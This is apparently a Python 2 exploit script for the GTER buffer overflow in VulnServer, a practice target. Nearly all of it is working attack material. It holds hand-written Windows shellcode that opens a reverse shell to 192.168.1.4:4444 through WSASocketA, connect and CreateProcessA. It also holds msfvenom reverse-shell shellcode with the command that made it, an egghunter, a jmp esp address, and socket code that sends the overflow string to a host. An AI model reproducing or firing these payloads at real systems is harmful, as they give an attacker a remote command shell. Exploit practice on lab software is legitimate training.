# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in VulnServer.

# 0x77ef6e7e : jmp esp |  {PAGE_EXECUTE_READ} [RPCRT4.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6477 (C:\WINDOWS\system32\RPCRT4.dll)
# nasm > jmp $-147
# 00000000  E968FFFFFF        jmp 0xffffff6d
 
# Gter No Egg

# arwin - win32 address resolution program - by steve hanna - v.01 CreateProcessA is located at 0x7c80236b in kernel32
# arwin - win32 address resolution program - by steve hanna - v.01 WSASocketA is located at 0x71ab8b6a in ws2_32
# arwin - win32 address resolution program - by steve hanna - v.01 connect is located at 0x71ab4a07 in ws2_32

# msfvenom shellcode command: msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b '\x00\x0A\x0D' -f python -v scode2

# Stack alignment

#00C0F97F   B8 22ACF322      MOV EAX,22F3AC22
#00C0F984   C1E8 08          SHR EAX,8
#00C0F979   50               PUSH EAX
#00C0F97A   5C               POP ESP

# Shellcode from https://www.absolomb.com/2018-07-24-VulnServer-GTER/

# 130 bytes

# scode3=  Shellcode0 + "\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x6A\x8B\xAB\x71\x31\xc0\xff" 
# scode3 += "\xd3\x96\x68\xc0\xa8\x01\x04\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\x07\x4A\xAB\x71" 
# scode3 += "\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52" 
# scode3 += "\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53"
# scode3 += "\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x6b\x23\x80\x7c\xff\xd3"


# Stack Alignment

#00C0F97F   B8 22ACF322      MOV EAX,22F3AC22
#00C0F984   C1E8 08          SHR EAX,8
#00C0F987   50               PUSH EAX
#0C0F988   5C               POP ESP

# WSASocketA Call

#00C0F989   33C0             XOR EAX,EAX
#00C0F98B   50               PUSH EAX
#00C0F98C   50               PUSH EAX
#00C0F98D   50               PUSH EAX
#00C0F98E   04 06            ADD AL,6
#00C0F990   50               PUSH EAX
#00C0F991   2C 05            SUB AL,5
#00C0F993   50               PUSH EAX
#00C0F994   40               INC EAX
#00C0F995   50               PUSH EAX
#00C0F996   B8 6A8BAB71      MOV EAX,WS2_32.WSASocketA
#00C0F99B   FFD0             CALL EAX
#00C0F99D   96               XCHG EAX,ESI


# Connect Call

#00C0F99E   33C0             XOR EAX,EAX
#00C0F9A0   68 C0A80104      PUSH 401A8C0
#00C0F9A5   66:68 115C       PUSH 5C11
#00C0F9A9   33DB             XOR EBX,EBX
#00C0F9AB   80C3 02          ADD BL,2
#00C0F9AE   66:53            PUSH BX
#00C0F9B0   8BD4             MOV EDX,ESP
#00C0F9B2   B3 10            MOV BL,10
#00C0F9B4   53               PUSH EBX
#00C0F9B5   52               PUSH EDX
#00C0F9B6   56               PUSH ESI
#00C0F9B7   B8 074AAB71      MOV EAX,WS2_32.connect
#00C0F9BC   FFD0             CALL EAX


# CreateProcessA

#00C0F9BE   BA 90636D64      MOV EDX,646D6390
#00C0F9C3   C1EA 08          SHR EDX,8
#00C0F9C6   52               PUSH EDX
#00C0F9C7   8BCC             MOV ECX,ESP
#00C0F9C9   33D2             XOR EDX,EDX
#00C0F9CB   83EC 10          SUB ESP,10
#00C0F9CE   8BDC             MOV EBX,ESP
#00C0F9D0   56               PUSH ESI
#00C0F9D1   56               PUSH ESI
#00C0F9D2   56               PUSH ESI
#00C0F9D3   52               PUSH EDX
#00C0F9D4   52               PUSH EDX
#00C0F9D5   33C0             XOR EAX,EAX
#00C0F9D7   40               INC EAX
#00C0F9D8   C1C0 08          ROL EAX,8
#00C0F9DB   50               PUSH EAX
#00C0F9DC   52               PUSH EDX
#00C0F9DD   52               PUSH EDX
#00C0F9DE   52               PUSH EDX
#00C0F9DF   52               PUSH EDX
#00C0F9E0   52               PUSH EDX
#00C0F9E1   52               PUSH EDX
#00C0F9E2   52               PUSH EDX
#00C0F9E3   52               PUSH EDX
#00C0F9E4   52               PUSH EDX
#00C0F9E5   52               PUSH EDX
#00C0F9E6   31C0             XOR EAX,EAX
#00C0F9E8   04 2C            ADD AL,2C
#00C0F9EA   50               PUSH EAX
#00C0F9EB   8BC4             MOV EAX,ESP
#00C0F9ED   53               PUSH EBX
#00C0F9EE   50               PUSH EAX
#00C0F9EF   52               PUSH EDX
#00C0F9F0   52               PUSH EDX
#00C0F9F1   52               PUSH EDX
#00C0F9F2   33C0             XOR EAX,EAX
#00C0F9F4   40               INC EAX
#00C0F9F5   50               PUSH EAX
#00C0F9F6   52               PUSH EDX
#00C0F9F7   52               PUSH EDX
#00C0F9F8   51               PUSH ECX
#00C0F9F9   52               PUSH EDX
#00C0F9FA   BB 6B23807C      MOV EBX,kernel32.CreateProcessA
#00C0F9FF   FFD3             CALL EBX





import socket


Shellcode0 = "\xB8\x22\xAC\xF3\x22\xC1\xE8\x08\x50\x5C"   #StackAlignment

Shellcode1 =  "\x33\xC0\x50\x50\x50\x04\x06\x50\x2C\x05\x50\x40\x50\xB8\x6A\x8B\xAB\x71\xFF\xD0\x96\x33\xc0"   #WSASocket

Shellcode2 = "\x68\xC0\xA8\x01\x04\x66\x68\x11\x5C\x33\xDB\x80\xC3\x02\x66\x53\x8B\xD4\xB3\x10\x53\x52\x56\xB8\x07\x4A\xAB\x71\xFF\xD0" #connect

Shellcode3 = "\xba\x90\x63\x6D\x64\xC1\xEA\x08\x52\x8B\xCC\x33\xD2\x83\xEC\x10\x8B\xDC\x56\x56\x56\x52\x52\x33\xC0\x40\xC1\xC0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xC0\x04\x2C\x50\x8B\xC4\x53\x50\x52\x52\x52\x33\xC0\x40\x50\x52\x52\x51\x52\xbb\x6b\x23\x80\x7c\xff\xd3" #CreateProcessA

eggHunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

scode2 =  ""
scode2 += "\xdb\xd3\xbe\x33\x8a\x92\x21\xd9\x74\x24\xf4\x58"
scode2 += "\x33\xc9\xb1\x56\x83\xe8\xfc\x31\x70\x14\x03\x70"
scode2 += "\x27\x68\x67\xdd\xaf\xee\x88\x1e\x2f\x8f\x01\xfb"
scode2 += "\x1e\x8f\x76\x8f\x30\x3f\xfc\xdd\xbc\xb4\x50\xf6"
scode2 += "\x37\xb8\x7c\xf9\xf0\x77\x5b\x34\x01\x2b\x9f\x57"
scode2 += "\x81\x36\xcc\xb7\xb8\xf8\x01\xb9\xfd\xe5\xe8\xeb"
scode2 += "\x56\x61\x5e\x1c\xd3\x3f\x63\x97\xaf\xae\xe3\x44"
scode2 += "\x67\xd0\xc2\xda\xfc\x8b\xc4\xdd\xd1\xa7\x4c\xc6"
scode2 += "\x36\x8d\x07\x7d\x8c\x79\x96\x57\xdd\x82\x35\x96"
scode2 += "\xd2\x70\x47\xde\xd4\x6a\x32\x16\x27\x16\x45\xed"
scode2 += "\x5a\xcc\xc0\xf6\xfc\x87\x73\xd3\xfd\x44\xe5\x90"
scode2 += "\xf1\x21\x61\xfe\x15\xb7\xa6\x74\x21\x3c\x49\x5b"
scode2 += "\xa0\x06\x6e\x7f\xe9\xdd\x0f\x26\x57\xb3\x30\x38"
scode2 += "\x38\x6c\x95\x32\xd4\x79\xa4\x18\xb0\x4e\x85\xa2"
scode2 += "\x40\xd9\x9e\xd1\x72\x46\x35\x7e\x3e\x0f\x93\x79"
scode2 += "\x37\x07\x24\x55\xff\x48\xda\x56\xff\x41\x19\x02"
scode2 += "\xaf\xf9\x88\x2b\x24\xfa\x35\xfe\xd0\xf0\xa1\xc1"
scode2 += "\x8c\x04\x36\xaa\xce\x06\x27\x76\x47\xe0\x17\xd6"
scode2 += "\x07\xbd\xd7\x86\xe7\x6d\xb0\xcc\xe8\x52\xa0\xee"
scode2 += "\x23\xfb\x4b\x01\x9d\x53\xe4\xb8\x84\x28\x95\x45"
scode2 += "\x13\x55\x95\xce\x91\xa9\x58\x27\xd0\xb9\x8d\x50"
scode2 += "\x1a\x42\x4e\xf5\x1a\x28\x4a\x5f\x4d\xc4\x50\x86"
scode2 += "\xb9\x4b\xaa\xed\xba\x8c\x54\x70\x8a\xe7\x63\xe6"
scode2 += "\xb2\x9f\x8b\xe6\x32\x60\xda\x6c\x32\x08\xba\xd4"
scode2 += "\x61\x2d\xc5\xc0\x16\xfe\x50\xeb\x4e\x52\xf2\x83"
scode2 += "\x6c\x8d\x34\x0c\x8f\xf8\x46\x4b\x6f\x7e\x61\xf4"
scode2 += "\x07\x80\x31\x04\xd7\xea\xb1\x54\xbf\xe1\x9e\x5b"
scode2 += "\x0f\x09\x35\x34\x07\x80\xd8\xf6\xb6\x95\xf0\x57"
scode2 += "\x66\x95\xf7\x43\x99\xec\x78\x73\x5a\x11\x91\x10"
scode2 += "\x5b\x11\x9d\x26\x60\xc7\xa4\x5c\xa7\xdb\x92\x6f"
scode2 += "\x92\x7e\xb2\xe5\xdc\x2d\xc4\x2f"

# 130 bytes
scode = Shellcode0 + Shellcode1 + Shellcode2 + Shellcode3


# Enable to use Egg Hunter

#cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#cnct.connect(('192.168.1.5',9999))
#print cnct.recv(1024)

#evilString = "GDOG YCSCYCSC" + scode2

#cnct.send(evilString)

#cnct.close()

cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.5',9999))
print cnct.recv(1024)

evilString = "GTER /.:/" + "\x90" * 10 + scode + "\x90" * 7 + "\x7e\x6e\xef\x77" + "\xE9\x64\xFF\xFF\xFF"

# Enable to use Egg Hunter

# evilString = "GTER /.:/" + "\x90" * 10 + eggHunter + "\x90" * 105 + "\x7e\x6e\xef\x77" + "\xE9\x64\xFF\xFF\xFF"

cnct.send(evilString)

cnct.close()

